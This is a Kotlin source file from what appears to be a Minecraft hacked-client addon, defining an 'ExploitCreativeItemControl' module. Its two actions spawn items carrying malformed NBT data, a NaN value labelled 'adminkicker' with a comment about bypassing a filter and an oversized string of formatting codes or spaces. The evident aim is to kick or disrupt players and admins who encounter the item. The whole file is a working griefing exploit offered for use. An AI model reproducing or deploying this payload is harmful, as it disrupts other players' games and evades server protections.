package de.florianmichael.tarasande_creative_features.creativesystem.impl

import de.florianmichael.tarasande_creative_features.creativesystem.ExploitCreative
import net.minecraft.item.Item
import net.minecraft.item.ItemStack
import net.minecraft.item.Items
import net.minecraft.nbt.NbtCompound
import net.minecraft.nbt.NbtDouble
import net.minecraft.nbt.NbtString
import net.minecraft.registry.Registries
import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueRegistry

class ExploitCreativeItemControl(parent: Any) : ExploitCreative(parent, "CreativeItemControl", ItemStack(Items.DRAGON_EGG)) {

    init {
        createAction("$name kick", icon) {
            val stack = ItemStack(this.item.entries()[0] as Item)
            var hacked = ""
            val illegal = NbtCompound()
            illegal.put("adminkicker", NbtDouble.of(Double.NaN)) // Cic Filter bypass by Paul
            for (i in 0 .. 899) hacked += "§c§l        "
            illegal.put("z", NbtString.of(hacked))
            stack.nbt = illegal

            give(stack)
        }

        createAction("$name clear", icon) {
            val stack = ItemStack(this.item.entries()[0] as Item)
            var hacked = ""
            val illegal = NbtCompound()
            illegal.put("adminkicker", NbtDouble.of(Double.NaN)) // Cic Filter bypass by Paul
            for (i in 0 .. 999) hacked += "               "
            illegal.put("z", NbtString.of(hacked))
            stack.nbt = illegal

            give(stack)
        }
    }

    private val item = object : ValueRegistry<Item>(parent, "Item", Registries.ITEM, true, Items.DRAGON_EGG) {
        override fun filter(key: Item) = key != Items.AIR
        override fun getTranslationKey(key: Any?) = (key as Item).translationKey
    }
}
